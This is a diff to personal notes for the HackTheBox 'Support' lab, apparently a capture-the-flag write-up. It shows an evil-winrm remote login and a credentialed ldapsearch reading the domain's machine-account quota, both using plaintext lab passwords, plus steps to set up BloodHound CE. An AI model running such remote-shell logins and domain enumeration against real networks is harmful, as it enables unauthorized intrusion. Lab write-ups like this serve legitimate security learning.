@@ -191,3 +191,21 @@ evil-winrm -u "support" -p "Ironside47pleasure40Watchful" --ip support.htb
 ```
 ![[Pasted image 20250622105158.png]]
 
+## Setup bloodhound env
+
+```bash
+curl -L https://ghst.ly/getbhce > docker-compose.yml
+sudo docker-compose pull && sudo docker-compose up
+```
+
+![[Pasted image 20250624000703.png]]
+
+
+LDAP query to extract the `ms-DS-MachineAccountQuota` from the domain class.
+```bash
+ldapsearch -H LDAP://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(ObjectClass=domainDNS)" ms-DS-MachineAccountQuota
+```
+
+
+
+https://breachar.medium.com/install-bloodhound-ce-under-kali-linux-2024-4-2a68feebdb62
